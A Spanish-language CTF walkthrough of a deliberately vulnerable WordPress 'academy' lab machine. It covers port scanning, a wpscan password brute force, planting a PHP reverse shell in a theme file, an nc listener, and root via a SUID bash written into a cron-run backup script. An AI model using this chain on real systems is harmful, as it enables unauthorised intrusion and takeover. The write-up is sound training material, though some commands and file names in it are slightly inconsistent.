# Fase 1- Tanteo
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/b7e5d798-b695-4592-a56a-84b85160b67d)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 9.2p1
2.  **80/tcp(HTTP):** Apache httpd 2.4.59

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Se encontró la pagina por defecto de apache2 debian.
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/d84a3292-60ac-4c37-a83d-13547fbfe2b5)

# Fase 2- Exploración

#### Feroxbuster
```r
301      GET        9l       28w      316c http://192.168.1.12/wordpress => http://192.168.1.12/wordpress/
```
Encontró un 301, osea un redirect.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/f5da033a-4c4c-47eb-ac40-0133bc895f47)
Resulto ser una Academia de hacking.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/707a2955-3abd-4032-8c7c-9d6aed168533)

Tenemos que agregar `academy.thl` al `/etc/hosts`.

#### Academia
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/1337d848-551c-40a8-9e4b-39f9a60fd50e)

Nos dice que la pagina utiliza un wordpress y que es inhackeable.

# Fase 3- Explotación

#### wordpress
```python
❯ wpscan --url http://academy.thl/wordpress/ --enumerate ap -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://academy.thl/wordpress/ [192.168.1.12]
[+] Started: Sun Jun 16 15:09:46 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://academy.thl/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://academy.thl/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://academy.thl/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://academy.thl/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://academy.thl/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://academy.thl/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://academy.thl/wordpress/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.1 (up to date)
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://academy.thl/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://academy.thl/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://academy.thl/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] dylan
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://academy.thl/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - dylan / password1                                                                                                                                                                               
Trying dylan / password1 Time: 00:00:00 <                                                                                                                            > (30 / 14344422)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: dylan, Password: password1

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jun 16 15:09:54 2024
[+] Requests Done: 55
[+] Cached Requests: 38
[+] Data Sent: 23.764 KB
[+] Data Received: 493.484 KB
[+] Memory used: 296.426 MB
[+] Elapsed time: 00:00:07
```
Usamos este comando para escanear el sitio de WordPress ubicado en `http://academy.thl/wordpress/` para enumerar todos los plugins instalados y, además, realiza un ataque de fuerza bruta para tratar de adivinar las contraseñas utilizando la lista de contraseñas `rockyou.txt`. En este caso encontró el usuario `dylan` y la contraseña `password1`.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/f1a65f6a-370d-4506-83c3-9c0265a2d0aa)

Y estamos dentro!

#### Wordpress Explotation
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/ead5ac6c-2351-43c9-a69d-785c2020f412)
Si vemos el resultado de wpscan podemos ver que el tema `twentytwentythree` tiene habilitado un directory listing.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/6f0928ee-dd2d-48a9-9dbd-2c1345cb6adc)
Nos dirigimos a la carpeta `/themes/twentytwentythree` y creamos un archivo `.txt` pero le cambiamos la extensión a `.php`. 

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/1dd123cd-c6cd-4626-9c6c-3266e2430301)

Le ponemos una reverse shell en php, Link: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/71d35142-48aa-43f5-a2df-92107efdaca8)

Y la tenemos!. Nos ponemos en modo escucha con el comando: `nc -nlvp <puerto>`

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/2b64d97c-f1c6-459c-8d8f-b887f8caa385)

Y ya estamos dentro!.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/eb7dc50c-fa31-4855-a7cb-d12eb1300e35)

Despues de realizar el tratamiento de la TTY, no encontramos ningún binario medio raro. Tocara buscar.

#### pspy64
Nos descargamos en la maquina victima la herramienta pspy64
```r
> wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
> chmod +x pspy64
> ./pspy64
```

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/1bb796fc-708f-4f07-a4d5-85cf4a1132a2)

Encontramos que se esta ejecutando el script backup.sh

```python
www-data@debian:/opt$ ls
backup.py
```
En dicho directorio encontramos un backup.py pero tenemos permisos de escritura así que vamos a crear un backup.sh.

```python
>echo 'chmod u+s /bin/bash' >> backup.sh
>chomod +x backup.sh
```
introducimos este comando para elevar nuestra bash.

Esperamos un par de minutos y ejecutamos el comando: `bash -p` para elevar y somos root!.
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/22f6c19d-0d3d-4939-8a26-4fcb4bb88fb7)

